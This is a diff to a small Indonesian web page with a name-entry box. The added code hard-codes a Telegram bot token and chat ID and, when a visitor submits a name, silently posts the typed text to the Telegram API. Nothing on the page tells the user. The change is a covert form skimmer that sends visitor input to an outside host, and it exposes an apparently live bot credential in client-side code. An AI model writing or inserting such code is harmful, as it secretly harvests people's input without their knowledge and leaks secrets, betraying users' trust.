@@ -72,6 +72,9 @@
       </div>
     </main>
   </body>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
   <script>
     const nama = document.getElementById("nama");
     const enter = document.getElementById("Enter");
@@ -84,6 +87,9 @@
     a.style.display = "none";
     b.style.display = "none";
     function ent() {
+      const pesan = `${nama.value}`;
+      const token = "6629142888:AAGwrjziBHjKRkXyMy0i_ag3tuN4D-qgd7I";
+      const user = "1689070194";
       if (nama.value == 0) {
         enter.textContent = "Masukin Nama";
       } else {
@@ -93,6 +99,10 @@
         enter.style.display = "none";
         a.style.display = "block";
         b.style.display = "block";
+        $.ajax({
+          url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${user}&text=${pesan}&parse_mode=html`,
+          method: `POST`,
+        });
       }
     }
     document.onkeydown = (e) => {
